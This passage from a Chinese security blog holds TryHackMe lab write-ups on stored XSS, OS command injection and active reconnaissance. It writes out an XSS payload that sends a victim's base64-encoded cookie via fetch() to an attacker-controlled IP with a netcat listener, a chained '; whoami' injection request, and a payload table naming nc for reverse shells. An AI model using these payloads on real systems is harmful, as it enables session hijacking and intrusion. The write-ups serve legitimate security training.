class="attr">class</span>=<span class="string">"form-control"</span>&gt;</span>hahaha<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>重新创建一个 ticket
，尝试使用<code>&lt;/textarea&gt;hahaha</code>闭合<code>textarea</code>标签，结果如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110233248687.png" alt="image-20230110233248687" style="zoom:80%;"></p>
<p>为了验证我们是否可以运行 JavaScript ，于是接着尝试 payload
：<code>&lt;/textarea&gt;&lt;script&gt;alert('THM');&lt;/script&gt;</code>，点击查看对应的
ticket ，出现弹窗：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110233514586.png" alt="image-20230110233514586">
<figcaption aria-hidden="true">image-20230110233514586</figcaption>
</figure>
<p>通过上述操作证实了 XSS
漏洞的存在，接着我们可以通过从另一个用户那里提取的 cookie
信息去劫持他们的登录会话以提高我们的权限。为了做到这一点，我们构建的
payload 需要能够提取用户的 cookie
信息并将其导出到我们选择的另一台web服务器上。首先，我们需要设置监听服务器来接收信息，也就是刚刚提到的“另一台web服务器”。</p>
<p>使用 <strong>Netcat</strong> 设置监听服务器（攻击者的服务器）：</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -nlvp 9001</span><br></pre></td></tr></tbody></table></figure>
<p>然后就是构建 payload
，格式为：<code>&lt;/textarea&gt;&lt;script&gt;fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );&lt;/script&gt;</code>。下面是对
payload 的解析：</p>
<ul>
<li><code>&lt;/textarea&gt;</code>标签的作用是闭合。</li>
<li><code>&lt;script&gt;</code>标签是为了打开一个编写 JavaScript
代码的区域。</li>
<li><code>fetch()</code>命令的作用是发出 HTTP 请求。</li>
<li><code>{URL_OR_IP}</code>是 THM 请求捕获器的 URL 或 THM Attackbox 的
IP 地址或你在THM VPN网络上的IP地址。（也就是监听服务器的 IP 地址）</li>
<li><code>?cookie=</code>是包含受害者 cookie 的查询字符串(query
string)。</li>
<li><code>btoa()</code>命令的作用是对受害者的 cookie 进行
base64编码。</li>
<li><code>document.cookie</code>用于获取 Acme IT Support 网站上受害者的
cookie 。</li>
<li><code>&lt;/script&gt;</code>用于关闭 JavaScript 代码区域。</li>
</ul>
<p>接下来就是利用具体的 payload 实现 XSS 攻击：创建一个新的 ticket
，填入 payload
：<code>&lt;/textarea&gt;&lt;script&gt;fetch('http://10.10.43.251:9001?cookie=' + btoa(document.cookie));&lt;/script&gt;</code>，创建完毕后，查看终端，得到结果：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230111100430594.png" alt="image-20230111100430594">
<figcaption aria-hidden="true">image-20230111100430594</figcaption>
</figure>
<p>最后通过 base64 解码得到 cookie
值：<code>4AB305E55955197693F01D6F8FD2D321</code>。</p>
<p>注：我一开始是使用自己的计算机，通过 openvpn
获取一个IP地址，然后在自己的计算机上进行实验，但是无法监听到结果，后来在浏览器使用
Attackbox ，得到结果。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/28/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">命令注入</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-02-28 14:30:13" itemprop="dateCreated datePublished" datetime="2023-02-28T14:30:13+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-06-10 15:48:59" itemprop="dateModified" datetime="2023-06-10T15:48:59+08:00">2023-06-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/TryHackMe/" itemprop="url" rel="index"><span itemprop="name">TryHackMe</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>4k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>4 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>TryHackMe实验房间：https://tryhackme.com/room/oscommandinjection</p>
<h2 id="introduction">Introduction</h2>
<p>命令注入(command
injection)是滥用应用程序的行为在操作系统上执行命令，执行命令时使用与设备上运行应用程序相同的权限。例如，在一个名为joe的用户运行的web服务器上实现命令注入，将在这个joe用户下执行命令——从而获得joe拥有的任何权限。</p>
<p>命令注入漏洞也被称为 <strong>RCE</strong> (Remote Code
Execution)，因为攻击者可以诱导应用程序执行他们提供的一些 payload
，而不需要直接访问机器本身(交互式shell)。Web服务器将处理攻击者传入的代码，并在用户权限和用户可访问的控制权限下执行该代码。</p>
<p>命令注入之所以又被称为 RCE
，是因为它能够在应用程序中远程执行代码，攻击者可以直接与目标系统进行交互。例如，攻击者可能会读取系统或用户文件、数据以及类似的内容。</p>
<p>一个命令注入的例子：滥用应用程序来执行命令<code>whoami</code>，以列出当前的用户。</p>
<h2 id="discovering-command-injection">Discovering Command
Injection</h2>
<p>存在命令注入漏洞是因为应用程序经常使用 PHP 、Python 和 NodeJS
等编程语言中的函数来向当前机器的操作系统传递数据 并进行系统调用。</p>
<p>在下面的代码段中，应用程序获取用户的输入，存储在变量<code>$title</code>中，然后应用程序通过该变量在目录中搜索对应的歌曲标题，下面分为四步分析。</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230112171437786.png" alt="image-20230112171437786">
<figcaption aria-hidden="true">image-20230112171437786</figcaption>
</figure>
<ol type="1">
<li>应用程序将 MP3文件存储在操作系统的某个目录中。</li>
<li><code>$title</code>变量存放用户输入的字符串</li>
<li><code>$title</code>变量中的数据被传递给命令<code>grep</code>，该命令在文件
<em>songtitle.txt</em> 中查找用户希望的内容。</li>
<li><em>songtitle.txt</em>文件的搜索结果将决定应用程序通知用户相关歌曲是否存在。</li>
</ol>
<p>这种信息通常存放在数据库中。这只是应用程序从用户获取输入然后以此与应用程序的操作系统交互的示例。</p>
<p>攻击者可以让应用程序执行自己注入的命令来滥用此应用程序。他们可以要求该应用程序从敏感的文件中读取数据，而不是使用<code>grep</code>在
<em>songtitle.txt</em> 中搜索条目。</p>
<p>下面是用 Python 编写的代码片段：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230112175932363.png" alt="image-20230112175932363">
<figcaption aria-hidden="true">image-20230112175932363</figcaption>
</figure>
<ol type="1">
<li><code>flask</code>包用于设置web服务器。</li>
<li>一个使用<code>subprocess</code>包在设备上执行命令的函数。</li>
<li>我们在web服务器中使用一个路由，它将执行提供的任何代码。例如，要执行<code>whoami</code>，我们需要访问<code>http://flaskapp.thm/whoami</code>。</li>
</ol>
<h2 id="exploiting-command-injection">Exploiting Command Injection</h2>
<p>通常可以通过应用程序的行为来判断是否能够进行命令注入。</p>
<p>使用用户输入用数据填充系统命令的应用程序通常会出现意外行为。例如，shell
运算符 <code>;</code>、<code>&amp;</code> 和 <code>&amp;&amp;</code>
将会组合两个或多个系统命令并执行它们。</p>
<p>命令注入可以通过以下两种方法进行检测：</p>
<ol type="1">
<li>Blind command injection</li>
<li>Verbose command injection</li>
</ol>
<p>下面是对这两种方法的详细介绍：</p>
<table>
<colgroup>
<col style="width: 14%">
<col style="width: 85%">
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;"><strong>Method</strong></th>
<th style="text-align: center;"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">Blind</td>
<td style="text-align: center;">这种类型的注入在测试 payload
时没有输出的地方（无回显），你必须调查应用程序的行为以确定 payload
是否有效。</td>
</tr>
<tr class="even">
<td style="text-align: center;">Verbose</td>
<td style="text-align: center;">这种注入是有回显的。例如，运行<code>whoami</code>命令可以查看应用程序当前的用户。Web应用程序会直接在页面上输出用户名。</td>
</tr>
</tbody>
</table>
<h3 id="检测-blind-command-injection">检测 Blind Command Injection</h3>
<p>发生该命令注入时没有可见的输出，因此不会立即显示出来。例如，执行一个命令，但
Web 应用程序不输出任何消息。</p>
<p>对于这种类型的命令注入，我们需要使用能够导致时间延迟的 payload
。例如，<code>ping</code>和<code>sleep</code>命令是对测试 payload
很重要。以<code>ping</code>为例，根据你指定的 <em>ping</em>
次数，该应用程序将挂起 <em>x</em> 秒。</p>
<p>另一种测试 blind command injection
的方法是强制输出。这可以通过使用重定向操作符(例如:<code>&gt;</code>)来完成。例如，我们可以告诉web应用程序执行<code>whoami</code>等命令并将其重定向到一个文件中，然后我们可以使用<code>cat</code>等命令读取文件内容。</p>
<p><code>curl</code>命令是测试命令注入的好方法，因为我们可以在 payload
中使用<code>curl</code>来向应用程序传递数据或者从应用程序中传递数据。以下面的代码为例，该
payload 可以向应用程序传递数据。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami</span><br><span class="line">经过url解码后：curl http://vulnerable.app/process.php?search=The Beatles; whoami</span><br></pre></td></tr></tbody></table></figure>
<h3 id="检测-verbose-command-injection">检测 Verbose Command
Injection</h3>
<p>这种命令注入是指应用程序向你提供有关正在发生或正在执行的内容的反馈或输出。例如，<code>ping</code>和<code>whoami</code>等命令的输出直接显示在web应用程序上。</p>
<h3 id="有用的-payload">有用的 payload</h3>
<p>Linux：</p>
<table>
<colgroup>
<col style="width: 15%">
<col style="width: 84%">
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;"><strong>Payload</strong></th>
<th style="text-align: center;"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">whoami</td>
<td style="text-align: center;">See what user the application is running
under.</td>
</tr>
<tr class="even">
<td style="text-align: center;">ls</td>
<td style="text-align: center;">List the contents of the current
directory. You may be able to find files such as configuration files,
environment files (tokens and application keys), and many more valuable
things.</td>
</tr>
<tr class="odd">
<td style="text-align: center;">ping</td>
<td style="text-align: center;">This command will invoke the application
to hang. This will be useful in testing an application for <strong>blind
command injection</strong>.</td>
</tr>
<tr class="even">
<td style="text-align: center;">sleep</td>
<td style="text-align: center;">This is another useful payload in
testing an application for <strong>blind command injection</strong>,
where the machine does not have <code>ping</code> installed.</td>
</tr>
<tr class="odd">
<td style="text-align: center;">nc</td>
<td style="text-align: center;">Netcat can be used to spawn a reverse
shell onto the vulnerable application. You can use this foothold to
navigate around the target machine for other services, files, or
potential means of escalating privileges.</td>
</tr>
</tbody>
</table>
<p>Windows：</p>
<table>
<colgroup>
<col style="width: 15%">
<col style="width: 84%">
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;"><strong>Payload</strong></th>
<th style="text-align: center;"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">whoami</td>
<td style="text-align: center;">See what user the application is running
under.</td>
</tr>
<tr class="even">
<td style="text-align: center;">dir</td>
<td style="text-align: center;">List the contents of the current
directory. You may be able to find files such as configuration files,
environment files (tokens and application keys), and many more valuable
things.</td>
</tr>
<tr class="odd">
<td style="text-align: center;">ping</td>
<td style="text-align: center;">This command will invoke the application
to hang. This will be useful in testing an application for <strong>blind
command injection</strong>.</td>
</tr>
<tr class="even">
<td style="text-align: center;">timeout</td>
<td style="text-align: center;">This command will also invoke the
application to hang. It is also useful for testing an application for
<strong>blind command injection</strong> if the <code>ping</code>
command is not installed.</td>
</tr>
</tbody>
</table>
<h2 id="remediating-command-injection预防命令注入">Remediating Command
Injection（预防命令注入）</h2>
<h3 id="vulnerable-functions易受攻击的函数"><strong>Vulnerable
Functions</strong>（易受攻击的函数）</h3>
<p>在 PHP 中，许多函数能够通过 shell
与操作系统交互并执行命令，例如：</p>
<ul>
<li>Exec</li>
<li>Passthru</li>
<li>System</li>
</ul>
<p>以下面的代码为例，应用程序只接受和处理输入到表单的<strong>数字</strong>，意味着不会处理任何命令。</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230112214000991.png" alt="image-20230112214000991">
<figcaption aria-hidden="true">image-20230112214000991</figcaption>
</figure>
<ol type="1">
<li>应用程序只接受特定的字符格式（数字 0 -- 9）。</li>
<li>应用程序仅执行该格式的数据。</li>
</ol>
<p>这些函数接受字符串或用户数据等输入，并执行系统上提供的任何内容。任何未经检查就使用这些函数的应用程序容易受到命令注入攻击。</p>
<h3 id="input-sanitisation输入检测"><strong>Input
sanitisation</strong>（输入检测）</h3>
<p>对用户输入进行检测和过滤是防止命令注入的好方法。这是一个指定用户可以提交的数据格式或类型的过程。例如，只接受数字类型的数据或删除任何特殊字符（如<code>&gt;</code>、<code>&amp;</code>和<code>/</code>）的输入字段。</p>
<p>在下面的代码中，<code>filter_input</code>函数用于检查用户输入的数据是否是数字，若不是数字，则这是一个无效的输入。</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">filter_input</span>(INPUT_GET, <span class="string">"number"</span>, FILTER_VALIDATE_NUMBER)) {</span><br><span class="line">        </span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
<h3 id="bypassing-filters绕过过滤器">Bypassing
Filters（绕过过滤器）</h3>
<p>应用程序将采用多种技术对从用户输入中获取的数据进行过滤和消毒。这些过滤器将限制你使用特定的
payload
；然而，我们可以利用应用程序背后的逻辑来绕过这些过滤器。例如，应用程序可以去掉引号，我们可以使用这个值的十六进制来实现相同的结果。</p>
<p>当执行时，虽然给定的数据将采用与预期不同的格式，但仍可以对其进行解释，并具有相同的结果。</p>
<h2 id="payload">Payload</h2>
<p>https://github.com/payloadbox/command-injection-payload-list</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/28/Active-Reconnaissance/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/Active-Reconnaissance/" class="post-title-link" itemprop="url">Active Reconnaissance(主动侦察)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-02-28 14:30:13" itemprop="dateCreated datePublished" datetime="2023-02-28T14:30:13+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-01-19 16:16:31" itemprop="dateModified" datetime="2023-01-19T16:16:31+08:00">2023-01-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/TryHackMe/" itemprop="url" rel="index"><span itemprop="name">TryHackMe</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>10 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>TryHackMe实验房间：https://tryhackme.com/room/activerecon</p>
<h2 id="introduction">Introduction</h2>
<p>本文中，我们集中在主动侦察和相关的基本工具。我们学习使用网络浏览器来收集关于我们目标的更多信息。此外，我们还将讨论如何使用
<code>ping</code>、 <code>traceroute</code>、 <code>telnet</code> 和
<code>nc</code> 等简单工具来收集有关网络、系统和服务的信息。</p>
<p>主动侦察需要你与目标进行某种接触。这种接触可以是一个电话或访问目标公司，以某种借口收集更多信息，通常作为社会工程的一部分。或者，它可以是到目标系统的直接连接，无论是访问他们的网站还是检查他们的防火墙是否打开了
SSH
端口。把它想象成你正在仔细检查窗户和门锁。因此，在获得客户签署的合法授权之前，切记不要从事主动侦察工作。</p>
<p>主动侦察从与目标机器的直接连接开始。任何这样的连接都可能在日志中留下显示客户端
IP
地址、连接时间和连接持续时间等信息。然而，并非所有的连接都是可疑的。可以让你的活动侦察显示为常规客户端活动。考虑网页浏览，没有人会怀疑一个浏览器连接到目标网络服务器和其他数百个合法用户。当你作为红队(攻击方)的一员工作时，你可以利用这些技巧，而不要惊动蓝队(防守方)。</p>
<h2 id="web-browser">Web Browser</h2>
<p>Web
浏览器是一个很方便的工具，尤其是在所有的系统上都可以使用。你可以通过几种方式使用
Web 浏览器来收集目标的信息。</p>
<p>在传输层上，浏览器连接如下：</p>
<ul>
<li>通过 HTTP 访问网站时，默认的 TCP 端口为 80</li>
<li>通过 HTTPS 访问网站时，默认的 TCP 端口为 443</li>
</ul>
<p>由于 80 和 443 是 HTTP 和 HTTPS 的默认端口，Web
浏览器不会在地址栏中显示它们。但是，可以使用自定义端口访问服务。例如，
https://127.0.0.1:8834/ 将通过 HTTPS 协议连接到端口8834的
127.0.0.1(localhost)。如果有一个 HTTPS
服务器监听该端口，我们将收到一个网页。</p>
<p>浏览网页时，你可以在 PC 上按 <code>Ctrl + Shift + I</code>，在
Firefox 上打开 开发者工具。类似的快捷方式也可以让你打开谷歌 Chrome 或
Chromium
的开发者工具。开发人员工具允许你检查浏览器已经接收并与远程服务器交换的许多内容。例如，您可以查看甚至修改
JavaScript (JS)文件，检查系统上的 cookie
，并查看站点内容的文件夹结构。</p>
<h2 id="ping">Ping</h2>
<p>Ping 属于协议 ICMP (Internet Control Message Protocol)的范畴。ICMP
支持许多类型的查询，但是我们这里主要关注 ping (ICMP echo/type 8)和 ping
reply (ICMP echo reply/type 0)。Ping
的主要目的是检查你是否能够到达远程系统，以及远程系统是否能够返回。换句话说，最初，这是用来检查网络连接性的;
然而，我们更感兴趣的是它的其他用途: 检查远程系统是否在线。</p>
<p>简单地说，ping
命令向远程系统发送数据包，远程系统回复。通过这种方式，你可以判断远程系统是否已联机，以及网络是否正在两个系统之间工作。</p>
<p>更具体的定义：ping 是一个将 ICMP Echo
数据包发送到远程系统的命令。如果远程系统在线，并且 ping
数据包被正确路由而且没有被任何防火墙阻塞，远程系统应该发回一个 ICMP Echo
应答。类似地，如果路由正确并且没有被任何防火墙阻塞，ping
应答会到达发送方系统。</p>
<p>这种命令的目的是在我们花时间进行更详细的扫描以发现正在运行的操作系统和服务之前，确保目标系统处于联机状态。</p>
<p>假设目标 IP
是<code>10.10.120.159</code>，在攻击方的终端上使用<code>ping 10.10.120.159</code>或者<code>ping HOSTNAME</code>，在后者中，系统需要在发送
ping 数据包之前将 <code>HOSTNAME</code> 解析为一个 IP
地址。如果你没有指定具体的次数，ping
将会一直重复发送-返回数据，使用<code>CTRL + c</code>可以停止数据的发送和接收。因此，如果你只想发送
10
个数据包，可以使用<code>ping -c 10 10.10.120.159</code>（Linux系统），或者使用<code>ping -n 10 10.10.120.159</code>（Windows系统）。</p>
<p>在下面的示例中，我们将数据包的总数指定为5。从 AttackBox
的终端，我们开始ping
<code>10.10.120.159</code>。我们了解到<code>10.10.120.159</code>已启动，并且未阻止ICMP回显请求。此外，数据包路由上的任何防火墙和路由器也没有阻止
ICMP 回显请求。</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">user@AttackBox$ ping -c 5 10.10.120.159</span><br><span class="line">PING 10.10.120.159 (MACHINE_IP) 56(84) bytes of data.</span><br><span class="line">64 bytes from MACHINE_IP: icmp_seq=1 ttl=64 time=0.636 ms</span><br><span class="line">64 bytes from MACHINE_IP: icmp_seq=2 ttl=64 time=0.483 ms</span><br><span class="line">64 bytes from MACHINE_IP: icmp_seq=3 ttl=64 time=0.396 ms</span><br><span class="line">64 bytes from MACHINE_IP: icmp_seq=4 ttl=64 time=0.416 ms</span><br><span class="line">64 bytes from MACHINE_IP: icmp_seq=5 ttl=64 time=0.445 ms</span><br><span class="line"></span><br><span class="line">--- MACHINE_IP ping statistics ---</span><br><span class="line">5 packets transmitted, 5 received, 0% packet loss, time 4097ms</span><br><span class="line">rtt min/avg/max/mdev = 0.396/0.475/0.636/0.086 ms</span><br></pre></td></tr></tbody></table></figure>
<p>在上面的示例中，我们清楚地看到了目标系统正在响应。Ping
输出表明它处于联机状态并且可访问。我们传输了五个数据包，并且收到了五个答复。我们注意到，平均而言，回复到达我们的系统需要
0.475ms（毫秒），最大值为 0.636ms。</p>
<p>从渗透测试的角度来看，我们将尝试发现有关此目标的更多信息。我们将尝试尽可能多地了解哪些端口是打开的以及正在运行哪些服务。</p>
<p>一般来说，当我们没有收到 ping 回复时，有以下解释：</p>
<ul>
<li>目标计算机没有响应; 可能仍在启动或关闭，或者操作系统已经崩溃。</li>
<li>它与网络断开连接，或者路径上有一个故障网络设备。</li>
<li>防火墙被配置为阻止这样的数据包。防火墙可能是在系统本身上运行的一个软件，或者是一个单独的网络设备。请注意，MS
Windows 防火墙默认阻止 ping。</li>
<li>你的系统已从网络中拔出。</li>
</ul>
<h2 id="traceroute">Traceroute</h2>
<p>顾名思义，traceroute
命令跟踪数据包从你的系统到另一台主机的路由。traceroute
的目的是查找数据包从系统到目标主机时所经过的路由器或每一跳(hop)的IP地址。该命令还显示了两个系统之间的路由器数量。它很有用，因为它指示了系统和目标主机之间的跳数（路由器）。然而，请注意，由于许多路由器使用适应网络变化的动态路由协议，数据包所采用的路由可能会发生变化。</p>
<p>在 Linux 和 MacOS
上，要使用的命令是<code>traceroute 10.10.120.159</code>，而在 MS Windows
上，它是<code>tracert 10.10.120.159</code>。<code>traceroute</code>试图从你的系统到目标系统的路径上发现路由器。</p>
<p>没有直接的方法来发现从你的系统到目标系统的路径。我们依靠ICMP“欺骗”路由器，使其暴露IP地址。我们可以通过在IP报头字段中使用一个小的生存时间（TTL）来实现这一点。虽然
TTL 中的 T
代表时间，但TTL表示数据包在丢弃之前可以通过的最大路由器/跳数；TTL
不是最大时间单位数。当路由器接收到一个数据包时，它将TTL减一，然后再将其传递给下一个路由器。下图显示，每次IP数据包通过路由器时，其TTL值都会减1。最初，它使系统的TTL值为64；它通过4个路由器后到达
TTL 值为60的目标系统。</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230119110311465.png" alt="image-20230119110311465">
<figcaption aria-hidden="true">image-20230119110311465</figcaption>
</figure>
<p>但是，如果 TTL 达到0，它将被丢弃，并且超过 ICMP
的生存时间将被发送给原始发送方。在下图中，系统在将 TTL
发送到路由器之前将其设置为1。路径上的第一个路由器将 TTL 减少 1 ，导致
TTL 为 0 。因此，此路由器将丢弃该数据包并发送 ICMP
传输超时的报错信息。注意，有些路由器被配置为在丢弃数据包时不发送这样的
ICMP 消息。</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230119110952069.png" alt="image-20230119110952069">
<figcaption aria-hidden="true">image-20230119110952069</figcaption>
</figure>
<p>在 Linux 中，<code>traceroute</code>将在 TTL 为 1 的 IP 分组内发送
UDP 数据报，因此，当它到达第一个路由器时，TTL 减为 0 ，并发送 ICMP
传输超时信息。因此，TTL = 1 将返回到达的第一个路由器IP。然后发送 TTL = 2
的分组，该分组将在第二个路由器处丢弃，以此继续下去。</p>
<p>在下面的示例中，我们从 TryHackMe 的 AtackBox 运行相同的命令
<code>traceroute tryhackme.com</code>。我们注意到，不同的运行可能导致分组采用不同的路由。</p>
<p><strong>Traceroute A</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">user@AttackBox$ traceroute tryhackme.com</span><br><span class="line">traceroute to tryhackme.com (172.67.69.208), 30 hops max, 60 byte packets</span><br><span class="line"> 1  ec2-3-248-240-5.eu-west-1.compute.amazonaws.com (3.248.240.5)  2.663 ms * ec2-3-248-240-13.eu-west-1.compute.amazonaws.com (3.248.240.13)  7.468 ms</span><br><span class="line"> 2  100.66.8.86 (100.66.8.86)  43.231 ms 100.65.21.64 (100.65.21.64)  18.886 ms 100.65.22.160 (100.65.22.160)  14.556 ms</span><br><span class="line"> 3  * 100.66.16.176 (100.66.16.176)  8.006 ms *</span><br><span class="line"> 4  100.66.11.34 (100.66.11.34)  17.401 ms 100.66.10.14 (100.66.10.14)  23.614 ms 100.66.19.236 (100.66.19.236)  17.524 ms</span><br><span class="line"> 5  100.66.7.35 (100.66.7.35)  12.808 ms 100.66.6.109 (100.66.6.109)  14.791 ms *</span><br><span class="line"> 6  100.65.14.131 (100.65.14.131)  1.026 ms 100.66.5.189 (100.66.5.189)  19.246 ms 100.66.5.243 (100.66.5.243)  19.805 ms</span><br><span class="line"> 7  100.65.13.143 (100.65.13.143)  14.254 ms 100.95.18.131 (100.95.18.131)  0.944 ms 100.95.18.129 (100.95.18.129)  0.778 ms</span><br><span class="line"> 8  100.95.2.143 (100.95.2.143)  0.680 ms 100.100.4.46 (100.100.4.46)  1.392 ms 100.95.18.143 (100.95.18.143)  0.878 ms</span><br><span class="line"> 9  100.100.20.76 (100.100.20.76)  7.819 ms 100.92.11.36 (100.92.11.36)  18.669 ms 100.100.20.26 (100.100.20.26)  0.842 ms</span><br><span class="line">10  100.92.11.112 (100.92.11.112)  17.852 ms * 100.92.11.158 (100.92.11.158)  16.687 ms</span><br><span class="line">11  100.92.211.82 (100.92.211.82)  19.713 ms 100.92.0.126 (100.92.0.126)  18.603 ms 52.93.112.182 (52.93.112.182)  17.738 ms</span><br><span class="line">12  99.83.69.207 (99.83.69.207)  17.603 ms  15.827 ms  17.351 ms</span><br><span class="line">13  100.92.9.83 (100.92.9.83)  17.894 ms 100.92.79.136 (100.92.79.136)  21.250 ms 100.92.9.118 (100.92.9.118)  18.166 ms</span><br><span class="line">14  172.67.69.208 (172.67.69.208)  17.976 ms  16.945 ms 100.92.9.3 (100.92.9.3)  17.709 ms</span><br></pre></td></tr></tbody></table></figure>
<p>在上面的 traceroute 输出中，我们有14个编号的行;
每一行代表一个路由器/跳。我们的系统发送三个 TTL
设置为1的数据包，然后发送三个 TTL
设置为2的数据包，依此类推。根据不同的网络拓扑，我们可能会收到多达3个不同路由器的回复，这取决于数据包所采用的路由。考虑第12行，列出
IP 地址的第12个路由器丢弃了数据包三次，并发送了 ICMP
传输超时的消息。第12行<code>99.83.69.207 (99.83.69.207)  17.603 ms  15.827 ms  17.351 ms</code>
显示每个回复到达我们系统的时间(毫秒)。</p>
<p>另一方面，我们可以看到，我们在第三行只收到一个单一的答复。<code>3 * 100.66.16.176 (100.66.16.176) 8.006 ms *</code>中的两个<code>*</code>表明我们的系统有两条预期超时的消息未收到。</p>
<p><strong>Traceroute B</strong></p>
